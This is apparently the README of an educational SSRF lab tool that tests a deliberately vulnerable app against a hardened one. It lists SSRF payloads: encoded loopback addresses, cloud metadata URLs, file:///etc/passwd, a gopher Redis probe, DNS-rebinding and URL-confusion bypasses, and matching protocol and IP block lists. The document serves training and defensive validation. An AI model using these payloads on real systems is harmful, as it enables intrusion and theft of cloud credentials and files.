# 🕵️‍♂️ SSRFStrike - Advanced SSRF Exploitation & Security Validation Suite

## 📋 Overview

**SSRFStrike** is the advanced exploitation tool integrated into the comprehensive SSRF Laboratory. It provides both automated testing capabilities and an interactive web interface for comprehensive SSRF vulnerability assessment as part of the "Build It, Break It, Fix It" methodology.

## 🎯 Integrated Project Architecture

```
ssrf-lab/
├── 🚨 vulnerable_app.py          # Intentionally vulnerable application
├── 🛡️ ssrfprotector.py           # SSRFProtector
├── 🛡️ secure_app.py              # Protected application  
├── 🏠 localhashboard.py          # Internal admin dashboard
├── ⚔️ ssrfstrike.py              # Advanced SSRF exploitation tool
├── ⚔️ test_file.txt              # Secret file
├── ⚔️ myfolder/myfile.txt        # Personal file
├── ⚔️ downloads                  # Downloads
├── 📦 requirements.txt           # Dependencies
└── 📚 README.md                  # Complete documentation
```

## ⚡ Quick Start

### Installation & Setup
```bash
# Clone and setup
git clone <repository>
cd ssrf-lab

# Create virtual environment
python -m venv venv
source venv/bin/activate  # Linux/Mac
# OR
.\venv\Scripts\activate  # Windows

# Install dependencies
pip install flask requests

# Start the vulnerable application for testing
python vulnerable_app.py &
```

## 🕵️‍♂️ SSRFStrike Usage

### Basic Usage
```bash
# Start web interface (default) - Access at http://localhost:8080
python ssrfstrike.py

# CLI mode against vulnerable application
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get

# CLI mode against secure application  
python ssrfstrike.py --mode cli http://127.0.0.2:5000/protected-proxy

# Save results to file
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get -o scan_results.json
```

### Test Suites
```bash
# Comprehensive testing (all attack vectors)
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite all

# IP Encoding Attacks
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite encoding

# Internal Service Enumeration
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite internal

# Cloud Metadata Access
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite cloud

# Protocol-Based Attacks
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite protocols

# Bypass Techniques
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite bypass
```

## 🔬 Complete Testing Workflow

### Step 1: Start All Services
```bash
# Terminal 1 - Vulnerable Application
python vulnerable_app.py

# Terminal 2 - Secure Application  
python secure_app.py

# Terminal 3 - Internal Dashboard (requires admin/sudo)
sudo python localhashboard.py

# Terminal 4 - SSRFStrike Tool
python ssrfstrike.py
```

### Step 2: Test Vulnerable Application
```bash
# Comprehensive attack against vulnerable app
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite all

# Expected: Multiple vulnerabilities found
# - File protocol access
# - Internal service enumeration  
# - Protocol attacks successful
```

### Step 3: Test Secure Application
```bash
# Validate security controls
python ssrfstrike.py --mode cli http://127.0.0.2:5000/protected-proxy --suite all

# Expected: All attacks blocked
# - Protocol validation working
# - IP filtering effective
# - Bypass attempts prevented
```

### Step 4: Analyze Results
```bash
# Generate comprehensive report
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get -o vulnerable_scan.json
python ssrfstrike.py --mode cli http://127.0.0.2:5000/protected-proxy -o secure_scan.json

# Compare results
diff vulnerable_scan.json secure_scan.json
```

## 🎯 SSRFStrike Test Coverage

### 1. IP Encoding Attacks
Tests various IP representation bypasses:
```bash
# Decimal: 127.0.0.1 → 2130706433
# Hexadecimal: 127.0.0.1 → 0x7f.0.0.1, 0x7f000001  
# Octal: 127.0.0.1 → 0177.0.0.1
# Mixed: 127.0.0.1 → 0x7f.1, 0177.0.0x1
```

### 2. Internal Service Enumeration
Discovers internal network services:
```bash
# Localhost variations
localhost, 127.0.0.1, 0.0.0.0, [::1]

# Common internal IPs  
192.168.1.1, 10.0.0.1, 172.16.0.1

# Application ports
80, 443, 8080, 3000, 5000, 6379, 11211
```

### 3. Cloud Metadata Access
Tests cloud provider metadata services:
```bash
# AWS EC2
169.254.169.254/latest/meta-data/

# Google Cloud
metadata.google.internal/computeMetadata/v1/

# Azure
169.254.169.254/metadata/instance

# DigitalOcean
169.254.169.254/metadata/v1/
```

### 4. Protocol-Based Attacks
Exploits dangerous URL schemes:
```bash
file:///etc/passwd                    # Local file read
gopher://127.0.0.1:6379/_INFO         # Redis exploitation
phar:///malicious.phar                # PHP deserialization
data:text/html,<script>alert(1)</script> # XSS injection
dict://127.0.0.1:11211/stats          # Service enumeration
```

### 5. Bypass Techniques
Tests evasion methods:
```bash
# DNS rebinding
127.0.0.1.nip.io, sslip.io, localtest.me

# URL parser confusion
http://127.0.0.1@google.com/
http://google.com@127.0.0.1/

# IPv6 variations
[::], [::1], [::ffff:127.0.0.1]
```

## 📊 Expected Results Matrix

| Test Category | Vulnerable App | Secure App | Learning Objective |
|---------------|----------------|------------|-------------------|
| **IP Encoding** | ✅ Exploitable | ✅ Blocked | Encoding detection |
| **Internal Services** | ✅ Accessible | ✅ Blocked | Network segmentation |
| **Cloud Metadata** | ✅ Accessible | ✅ Blocked | Metadata protection |
| **File Protocol** | ✅ Read files | ✅ Blocked | Protocol validation |
| **Gopher Protocol** | ✅ Exploitable | ✅ Blocked | Dangerous protocols |
| **DNS Rebinding** | ✅ Bypass works | ✅ Blocked | DNS validation |
| **Data URI** | ✅ Injection works | ✅ Blocked | Input sanitization |

## 🛡️ Security Control Validation

SSRFStrike validates these security mechanisms:

### 1. Protocol Validation
```python
# Tests if these are properly blocked
BLOCKED_PROTOCOLS = ['file://', 'gopher://', 'phar://', 'data://', 'dict://']
```

### 2. IP Address Filtering
```python
# Validates private IP blocking
PRIVATE_RANGES = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8']
```

### 3. Input Sanitization
```python
# Tests encoding bypass detection
ENCODING_TYPES = ['decimal', 'hexadecimal', 'octal', 'mixed']
```

### 4. DNS Security
```python
# Validates DNS rebinding protection
BYPASS_SERVICES = ['nip.io', 'sslip.io', 'localtest.me', 'lvh.me']
```

## 🔧 Advanced Testing Scenarios

### Custom Target Testing
```bash
# Test specific application endpoints
python ssrfstrike.py --mode cli http://127.0.0.2:5000/webhook
python ssrfstrike.py --mode cli http://127.0.0.2:5000/image-proxy
python ssrfstrike.py --mode cli http://127.0.0.2:5000/api/export

# Test with different applications
python ssrfstrike.py --mode cli http://app.company.com/ssrf-endpoint
```

### Integration with Development
```bash
# Test in CI/CD pipeline
python ssrfstrike.py --mode cli $STAGING_URL --suite all

# Security gate check
python ssrfstrike.py --mode cli $APP_URL && echo "SSRF checks passed"

# Generate compliance reports
python ssrfstrike.py --mode cli $PROD_URL -o security_audit.json
```

## 📈 Learning Progression

### Phase 1: Vulnerability Discovery
```bash
# Discover what attacks work
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get --suite all
```

### Phase 2: Defense Implementation
```bash
# Implement protections in secure_app.py
# Test if vulnerabilities are fixed
python ssrfstrike.py --mode cli http://127.0.0.2:5000/protected-proxy --suite all
```

### Phase 3: Control Validation
```bash
# Verify security controls are effective
python ssrfstrike.py --mode cli http://127.0.0.2:5000/protected-proxy --suite bypass
```

### Phase 4: Advanced Testing
```bash
# Test custom applications
python ssrfstrike.py --mode cli http://your-app.com/endpoint --suite all
```

## 🎓 Educational Outcomes

Using SSRFStrike in the lab helps understand:

### Technical Skills
- SSRF vulnerability patterns and exploitation
- Defense mechanism implementation
- Security control validation
- Risk assessment methodologies

### Professional Skills
- Automated security testing
- Penetration testing methodologies  
- Security reporting and documentation
- Compliance validation

### Real-World Application
- Cloud security configurations
- Network segmentation principles
- Input validation best practices
- Incident response preparation

## 🔒 Responsible Usage

### Authorization Requirements
```bash
# Only test systems you own or have explicit permission to test
python ssrfstrike.py --mode cli http://your-own-server.com

# Use in isolated environments for learning
python ssrfstrike.py --mode cli http://127.0.0.2:5000

# Respect scanning policies and rate limits
```

### Legal Compliance
- Obtain proper authorization before testing
- Follow responsible disclosure practices  
- Adhere to local laws and regulations
- Use only in educational or authorized contexts

## 🚀 Getting Help

### Common Issues
```bash
# Port conflicts
python ssrfstrike.py --port 8081

# Missing dependencies  
pip install --upgrade flask requests

# Application not running
# Ensure vulnerable_app.py is running on port 5000
```

### Debug Mode
```bash
# Enable verbose output
export SSRFSTRIKE_DEBUG=1
python ssrfstrike.py --mode cli http://127.0.0.2:5000/get
```

---

**SSRFStrike** completes the SSRF Laboratory by providing professional-grade testing capabilities that bridge the gap between theoretical understanding and practical security assessment. 🛡️